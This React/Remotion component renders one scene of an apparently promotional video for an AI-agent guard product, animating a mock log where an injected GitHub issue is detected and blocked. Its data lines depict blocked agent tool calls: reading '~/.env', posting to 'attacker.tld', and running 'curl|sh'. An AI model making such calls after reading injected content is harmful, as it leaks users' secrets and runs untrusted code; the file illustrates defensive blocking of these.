import React from "react";
import { AbsoluteFill, useCurrentFrame, useVideoConfig, interpolate, spring } from "remotion";
import { C, FONTS, SPRING } from "../design/tokens";
import { Mono, useEnter, useAccent } from "../design/Type";

const LINES = [
  { t: "guard.intercept", v: "tool.github.issues.get  →  payload received" },
  { t: "guard.scan",      v: "indirect_injection · confidence 0.97" },
  { t: "guard.deny",      v: "tool.fs.read('~/.env')      403" },
  { t: "guard.deny",      v: "tool.http.post(attacker.tld) 403" },
  { t: "guard.deny",      v: "tool.shell.exec('curl|sh')  403" },
  { t: "guard.emit",      v: "audit.log · evt_a91f · signed" },
  { t: "guard.report",    v: "exfiltrated=0  saved=247KB  decision=12ms" },
];

const Term: React.FC = () => {
  const f = useCurrentFrame();
  return (
    <div style={{
      background: "#06090F",
      border: `1px solid ${C.rule}`,
      borderRadius: 12,
      padding: "26px 30px",
      fontFamily: FONTS.mono,
      fontSize: 18,
      lineHeight: 1.7,
      color: C.paper,
      height: "100%",
      boxShadow: "0 40px 120px -40px rgba(0,0,0,0.7)",
    }}>
      <div style={{ display: "flex", gap: 6, marginBottom: 16 }}>
        {["#FF6B6B", "#FFB547", "#3DDC97"].map(c => <span key={c} style={{ width: 12, height: 12, borderRadius: 999, background: c, opacity: 0.6 }} />)}
        <span style={{ marginLeft: 14, color: C.muted, fontSize: 14 }}>anveguard · runtime.log</span>
      </div>
      {LINES.map((l, i) => {
        const appear = interpolate(f, [10 + i * 14, 24 + i * 14], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
        const isDeny = l.t === "guard.deny";
        const isReport = l.t === "guard.report";
        return (
          <div key={i} style={{ opacity: appear, display: "flex", gap: 14 }}>
            <span style={{ color: C.mutedSoft, width: 32, textAlign: "right" }}>{String(i + 1).padStart(2, "0")}</span>
            <span style={{ color: isDeny ? C.alert : isReport ? C.ok : C.signal }}>{l.t}</span>
            <span style={{ color: C.paper, opacity: 0.9 }}>{l.v}</span>
          </div>
        );
      })}
      <div style={{ display: "flex", gap: 14, marginTop: 4, opacity: interpolate(f, [120, 140], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" }) }}>
        <span style={{ color: C.mutedSoft, width: 32, textAlign: "right" }}>{String(LINES.length + 1).padStart(2, "0")}</span>
        <span style={{ color: C.paper }}>{">"}</span>
        <span style={{ borderRight: `2px solid ${C.signal}`, opacity: Math.sin(f / 4) > 0 ? 1 : 0 }}>&nbsp;</span>
      </div>
    </div>
  );
};

const Tile: React.FC<{ label: string; value: string; tone?: string; delay: number; pulse?: boolean }> = ({ label, value, tone = C.paper, delay, pulse }) => {
  const f = useCurrentFrame();
  const { fps } = useVideoConfig();
  const s = spring({ frame: f - delay, fps, config: SPRING.enter });
  const p = pulse ? 1 + 0.04 * Math.max(0, Math.sin((f - delay - 30) / 6)) : 1;
  return (
    <div style={{
      opacity: s,
      transform: `translateY(${interpolate(s, [0, 1], [16, 0])}px) scale(${p})`,
      background: C.panel,
      border: `1px solid ${C.rule}`,
      borderRadius: 12,
      padding: "22px 24px",
    }}>
      <div style={{ fontFamily: FONTS.mono, fontSize: 13, color: C.muted, letterSpacing: 2, textTransform: "uppercase" }}>{label}</div>
      <div style={{ fontFamily: FONTS.sans, fontSize: 44, color: tone, fontWeight: 600, letterSpacing: -1, marginTop: 6 }}>{value}</div>
    </div>
  );
};

export const S5_Audit: React.FC = () => {
  return (
    <AbsoluteFill style={{ fontFamily: FONTS.sans, color: C.paper, padding: "80px 120px" }}>
      <Mono size={16} color={C.muted}>step 04 · signed audit log</Mono>
      <div style={{ fontSize: 56, fontWeight: 600, letterSpacing: -1.2, marginTop: 12, lineHeight: 1.05, ...useEnter(6) }}>
        Replayable. Signed. Zero bytes leaked.
      </div>
      <div style={{ display: "grid", gridTemplateColumns: "1.5fr 1fr", gap: 36, marginTop: 36, height: 580 }}>
        <Term />
        <div style={{ display: "grid", gridTemplateRows: "repeat(4, 1fr)", gap: 16 }}>
          <Tile label="exfiltrated" value="0 bytes" tone={C.ok} delay={24} />
          <Tile label="would have leaked" value="247 KB" tone={C.alert} delay={40} pulse />
          <Tile label="decision time" value="12 ms" delay={56} />
          <Tile label="replayable" value="100%" tone={C.signal} delay={72} />
        </div>
      </div>
    </AbsoluteFill>
  );
};
